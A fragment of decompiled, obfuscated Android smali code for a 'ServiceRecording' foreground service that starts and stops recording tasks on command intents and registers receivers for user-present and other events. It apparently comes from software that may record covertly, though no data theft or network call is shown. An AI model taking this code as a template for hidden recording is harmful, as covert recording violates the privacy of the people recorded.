    if-eqz v3, :cond_6

    .line 2
    sget-object v0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    iput-boolean v5, v0, Lcom/utils/services/ServiceRecording;->b:Z

    if-nez p0, :cond_1

    sget-object v0, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {v0}, Ljava/lang/Enum;->ordinal()I

    move-result v0

    invoke-static {v0, v6}, Lcom/utils/services/ServiceRecording;->c(II)Z

    move-result v0

    if-nez v0, :cond_1

    sget-object v0, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {v0}, Ljava/lang/Enum;->ordinal()I

    move-result v0

    invoke-static {v0, v5}, Lcom/utils/services/ServiceRecording;->c(II)Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-eqz v0, :cond_5

    :cond_1
    :try_start_1
    sget-object v0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    if-eqz v0, :cond_4

    const-string v0, "check"

    invoke-static {v2, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    if-eqz p0, :cond_2

    sget-object p0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    sget-object v0, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {v0}, Ljava/lang/Enum;->ordinal()I

    move-result v0

    invoke-direct {p0, v0, v6}, Lcom/utils/services/ServiceRecording;->b(II)V

    sget-object p0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    sget-object v0, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {v0}, Ljava/lang/Enum;->ordinal()I

    move-result v0

    invoke-direct {p0, v0, v5}, Lcom/utils/services/ServiceRecording;->b(II)V

    :cond_2
    sget-object p0, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {p0}, Ljava/lang/Enum;->ordinal()I

    move-result p0

    invoke-static {p0, v6}, Lcom/utils/services/ServiceRecording;->c(II)Z

    move-result p0

    if-eqz p0, :cond_3

    invoke-static {}, Lcom/utils/core/u;->l()Z

    move-result p0

    if-nez p0, :cond_3

    invoke-static {v6}, Lcom/utils/services/ServiceRecording;->b(I)V

    goto :goto_1

    :cond_3
    sget-object p0, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {p0}, Ljava/lang/Enum;->ordinal()I

    move-result p0

    invoke-static {p0, v6}, Lcom/utils/services/ServiceRecording;->c(II)Z

    move-result p0

    if-eqz p0, :cond_5

    sget-object p0, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {p0}, Ljava/lang/Enum;->ordinal()I

    move-result p0

    invoke-static {p0, v5}, Lcom/utils/services/ServiceRecording;->c(II)Z

    move-result p0

    if-eqz p0, :cond_5

    invoke-static {}, Lcom/utils/core/u;->m()Z

    move-result p0

    if-eqz p0, :cond_5

    invoke-static {v5}, Lcom/utils/services/ServiceRecording;->b(I)V

    goto :goto_1

    :cond_4
    const-string p0, "s-N"

    invoke-static {v2, p0}, Lb/d/c/d0;->b(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    :catch_0
    move-exception p0

    :try_start_2
    invoke-static {v2, v1, p0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_5
    :goto_1
    sget-object p0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    iput-boolean v6, p0, Lcom/utils/services/ServiceRecording;->b:Z

    goto :goto_3

    :cond_6
    new-instance p0, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "n s "

    invoke-virtual {p0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    if-eqz v3, :cond_7

    sget-object v3, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    iget-boolean v3, v3, Lcom/utils/services/ServiceRecording;->b:Z

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    goto :goto_2

    :cond_7
    const-string v3, "nl"

    :goto_2
    invoke-virtual {p0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    sget-object v4, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {v4}, Ljava/lang/Enum;->ordinal()I

    move-result v4

    aget-object v3, v3, v4

    iget-boolean v3, v3, Lcom/utils/services/b;->e:Z

    invoke-virtual {p0, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Lcom/utils/core/u;->m()Z

    move-result v0

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {v2, p0}, Lb/d/c/d0;->b(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_3

    :catch_1
    move-exception p0

    invoke-static {v2, v1, p0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_8
    :goto_3
    return-void
.end method

.method private static c(II)Z
    .locals 2

    sget-object v0, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v1, v0, p0

    iget-object v1, v1, Lcom/utils/services/b;->c:[Landroid/view/View;

    aget-object v1, v1, p1

    if-eqz v1, :cond_1

    aget-object p0, v0, p0

    iget-object p0, p0, Lcom/utils/services/b;->c:[Landroid/view/View;

    aget-object p0, p0, p1

    invoke-virtual {p0}, Landroid/view/View;->getParent()Landroid/view/ViewParent;

    move-result-object p0

    if-nez p0, :cond_0

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    goto :goto_1

    :cond_1
    :goto_0
    const/4 p0, 0x1

    :goto_1
    return p0
.end method

.method private d()I
    .locals 2

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Landroid/app/Service;->stopForeground(Z)V

    :cond_0
    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    const/4 v0, 0x2

    return v0
.end method

.method public static d(Z)Z
    .locals 4

    const-string v0, "SrvR"

    const/4 v1, 0x0

    :try_start_0
    sget-object v2, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {v2}, Ljava/lang/Enum;->ordinal()I

    move-result v2

    sget-object v3, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v2, v3, v2

    iget-object v2, v2, Lcom/utils/services/b;->d:Lb/d/c/i;

    check-cast v2, Lb/d/f/e;

    if-eqz v2, :cond_1

    if-eqz p0, :cond_0

    invoke-virtual {v2}, Lb/d/f/e;->g()V

    const-string p0, "stop+"

    invoke-static {v0, p0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    :cond_0
    invoke-virtual {v2}, Lb/d/f/e;->f()Z

    const-string p0, "ofh!"

    invoke-static {v0, p0}, Lb/d/c/d0;->b(Ljava/lang/String;Ljava/lang/String;)V

    :goto_0
    const/4 p0, 0x1

    const/4 v1, 0x1

    goto :goto_1

    :cond_1
    const-string p0, "null-"

    invoke-static {v0, p0}, Lb/d/c/d0;->b(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p0

    const-string v2, "strt"

    invoke-static {v0, v2, p0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :goto_1
    return v1
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 2

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    sget-object v0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    if-nez v0, :cond_0

    sput-object p0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    invoke-static {}, Lcom/utils/receivers/ReceiverSubIn;->a()V

    invoke-static {}, Lcom/utils/receivers/ReceiverUserPresent;->a()V

    const-string v0, "SrvR"

    const-string v1, "+"

    invoke-static {v0, v1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    return-void
.end method

.method public onDestroy()V
    .locals 2

    sget-object v0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    sput-object v0, Lcom/utils/services/ServiceRecording;->e:Lcom/utils/services/ServiceRecording;

    iput-object v0, p0, Lcom/utils/services/ServiceRecording;->c:Landroid/app/Notification;

    const-string v0, "SrvR"

    const-string v1, "-"

    invoke-static {v0, v1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Lcom/utils/receivers/ReceiverSubOut;->b()V

    invoke-static {}, Lcom/utils/receivers/ReceiverUserPresent;->b()V

    invoke-static {}, Lcom/utils/receivers/ReceiverSubIn;->b()V

    :cond_0
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 7

    const-string p2, ""

    sget p3, Landroid/os/Build$VERSION;->SDK_INT:I

    const-string v0, "SrvR"

    const/16 v1, 0x1a

    if-lt p3, v1, :cond_0

    iget-object p3, p0, Lcom/utils/services/ServiceRecording;->c:Landroid/app/Notification;

    if-nez p3, :cond_0

    const/16 p3, 0x64

    :try_start_0
    const-string v1, "Srvr"

    invoke-static {p0, v1, p2, p2}, Lcom/utils/services/ServiceCore;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/app/Notification;

    move-result-object p2

    iput-object p2, p0, Lcom/utils/services/ServiceRecording;->c:Landroid/app/Notification;

    iget-object p2, p0, Lcom/utils/services/ServiceRecording;->c:Landroid/app/Notification;

    invoke-virtual {p0, p3, p2}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p2

    const-string p3, "srvF"

    invoke-static {v0, p3, p2}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_0
    :goto_0
    const/4 p2, 0x0

    if-eqz p1, :cond_1

    :try_start_1
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object p1

    goto :goto_1

    :catch_1
    move-exception p1

    goto/16 :goto_5

    :cond_1
    move-object p1, p2

    :goto_1
    if-eqz p1, :cond_b

    const-string p3, "INTENT_FUNC_KEY"

    invoke-virtual {p1, p3}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p3

    invoke-static {p3}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_2

    const-string p1, "Null srv cmd"

    :goto_2
    invoke-static {v0, p1}, Lb/d/c/d0;->b(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_6

    :cond_2
    const-string v1, "INTENT_STOP_KEY"

    invoke-virtual {p1, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    const/4 v3, 0x1

    if-eqz v1, :cond_3

    const-string v4, "stop"

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_3

    const/4 v1, 0x1

    goto :goto_3

    :cond_3
    const/4 v1, 0x0

    :goto_3
    invoke-static {p3}, Lcom/utils/services/d;->valueOf(Ljava/lang/String;)Lcom/utils/services/d;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Enum;->ordinal()I

    move-result v5
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    const-string v6, " "

    if-eqz v1, :cond_8

    :try_start_2
    sget-object p1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object p1, p1, v5

    iput-boolean v3, p1, Lcom/utils/services/b;->e:Z

    invoke-direct {p0, v5, v2}, Lcom/utils/services/ServiceRecording;->b(II)V

    invoke-direct {p0, v5, v3}, Lcom/utils/services/ServiceRecording;->b(II)V

    sget-object p1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object p1, p1, v5

    iget-object p1, p1, Lcom/utils/services/b;->d:Lb/d/c/i;

    if-eqz p1, :cond_6

    sget-object p1, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    invoke-virtual {p1}, Ljava/lang/Enum;->ordinal()I

    move-result p1

    if-ne v5, p1, :cond_4

    sget-object p1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object p1, p1, v5

    iget-object p1, p1, Lcom/utils/services/b;->d:Lb/d/c/i;

    check-cast p1, Lb/d/f/e;

    invoke-virtual {p1}, Lb/d/f/e;->g()V

    :cond_4
    sget-object p1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object p1, p1, v5

    invoke-virtual {p1}, Lcom/utils/services/b;->a()Ljava/lang/String;

    move-result-object p1

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "En: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "["

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object p1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object p1, p1, v5

    iget-object p1, p1, Lcom/utils/services/b;->d:Lb/d/c/i;

    invoke-virtual {p1}, Lb/d/c/i;->a()Lb/d/c/h;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string p1, "]"

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    sget-object p1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object p1, p1, v5

    iget-object p1, p1, Lcom/utils/services/b;->d:Lb/d/c/i;

    invoke-virtual {p1}, Lb/d/c/i;->a()Lb/d/c/h;

    move-result-object p1

    sget-object p3, Lb/d/c/h;->b:Lb/d/c/h;

    if-ne p1, p3, :cond_5

    sget-object p1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object p1, p1, v5

    iget-object p1, p1, Lcom/utils/services/b;->d:Lb/d/c/i;

    invoke-virtual {p1, v3}, Lb/d/c/i;->a(Z)Z

    :cond_5
    sget-object p1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object p1, p1, v5

    iput-object p2, p1, Lcom/utils/services/b;->d:Lb/d/c/i;

    goto :goto_4

    :cond_6
    sget-object p1, Lcom/utils/services/d;->a:Lcom/utils/services/d;

    if-eq v4, p1, :cond_7

    const-string p1, "ofh"

    invoke-static {v0, p1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_7
    :goto_4
    invoke-direct {p0, v3}, Lcom/utils/services/ServiceRecording;->b(Z)Ljava/lang/String;

    goto/16 :goto_6

    :cond_8
    invoke-direct {p0, v2}, Lcom/utils/services/ServiceRecording;->b(Z)Ljava/lang/String;

    move-result-object p2

    sget-object v1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v1, v1, v5

    iget-object v1, v1, Lcom/utils/services/b;->d:Lb/d/c/i;

    if-nez v1, :cond_a

    sget-object v1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object v1, v1, v5

    iput-boolean v2, v1, Lcom/utils/services/b;->e:Z

    const-string v1, "INTENT_PARAM"

    invoke-virtual {p1, v1}, Landroid/os/Bundle;->getBundle(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    iput-object p1, p0, Lcom/utils/services/ServiceRecording;->a:Landroid/os/Bundle;

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Bg: "

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p3, " par:"

    invoke-virtual {p1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object p3, p0, Lcom/utils/services/ServiceRecording;->a:Landroid/os/Bundle;

    invoke-virtual {p1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    sget-object p1, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    if-ne v4, p1, :cond_9

    invoke-static {v3}, Lcom/utils/services/ServiceRecording;->c(Z)V

    sget-object p1, Lcom/utils/services/ServiceRecording;->f:[Lcom/utils/services/b;

    aget-object p1, p1, v5

    new-instance p2, Lb/d/f/e;

    invoke-direct {p2}, Lb/d/f/e;-><init>()V

    iget-object p3, p0, Lcom/utils/services/ServiceRecording;->a:Landroid/os/Bundle;

    invoke-virtual {p1, p2, p3}, Lcom/utils/services/b;->a(Lb/d/c/i;Ljava/lang/Object;)V

    goto :goto_6

    :cond_9
    sget-object p1, Lcom/utils/services/d;->a:Lcom/utils/services/d;

    if-ne v4, p1, :cond_b

    invoke-static {v2}, Lcom/utils/services/ServiceRecording;->d(Z)Z

    move-result p1

    if-nez p1, :cond_b

    sget-object p1, Lcom/utils/services/d;->b:Lcom/utils/services/d;

    iget-object p2, p0, Lcom/utils/services/ServiceRecording;->a:Landroid/os/Bundle;

    invoke-static {p1, p2}, Lcom/utils/services/ServiceRecording;->a(Lcom/utils/services/d;Landroid/os/Bundle;)V

    goto :goto_6

    :cond_a
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p2, " busy"

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto/16 :goto_2

    :goto_5
    const-string p2, "strt"

    invoke-static {v0, p2, p1}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_b
    :goto_6
    const/4 p1, 0x2

    return p1
.end method
